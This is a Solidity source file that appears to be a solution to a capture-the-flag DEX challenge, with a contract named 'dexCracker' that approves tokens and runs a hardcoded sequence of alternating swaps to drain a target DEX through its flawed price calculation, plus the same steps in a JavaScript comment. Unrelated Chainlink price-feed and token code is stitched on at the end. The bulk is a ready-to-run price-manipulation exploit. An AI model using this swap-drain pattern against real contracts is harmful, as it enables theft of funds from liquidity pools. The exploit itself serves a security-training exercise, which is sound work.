// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    
    function setTokens(address _token1, address _token2) external;
    
    function addLiquidity(address token_address, uint256 amount) external;
    
    function swap(address from, address to, uint256 amount) external;
    
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external;
    
    function balanceOf(address token, address account) external view returns (uint256);
}


contract dexCracker {
    IDex public dex;
    address public t1;
    address public t2;

    constructor() {
    // constructor(address _dex, address _t1, address _t2) {
        // dex = IDex(_dex);
        dex = IDex(0x48a700C8b0edBA07411837CfFc6DDdBB67F949F9);
        t1 = dex.token1();
        t2 = dex.token2();
    }

    function crack() public {
        dex.approve(address(dex), 500);
        
        dex.swap(t1, t2, 10);
        dex.swap(t2, t1, 20);
        dex.swap(t1, t2, 24);
        dex.swap(t2, t1, 30);
        dex.swap(t1, t2, 41);
        dex.swap(t2, t1, 45);
    }

    /*JS
    await contract.approve(contract.address, 500)

    t1 = await contract.token1()
    t2 = await contract.token2()

    await contract.swap(t1, t2, 10)
    await contract.swap(t2, t1, 20)
    await contract.swap(t1, t2, 24)
    await contract.swap(t2, t1, 30)
    await contract.swap(t1, t2, 41)
    await contract.swap(t2, t1, 45)


    await contract.balanceOf(t1, instance).then(v => v.toString())
    */
}

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {
    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Sepolia
     * Aggregator: BTC/USD
     * Address: 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
     */
    constructor() {
        priceFeed = AggregatorV3Interface(
            0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43
        );
    }

    /**
     * Returns the latest price.
     */
    function getLatestPrice() public view returns (int) {
        // prettier-ignore
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}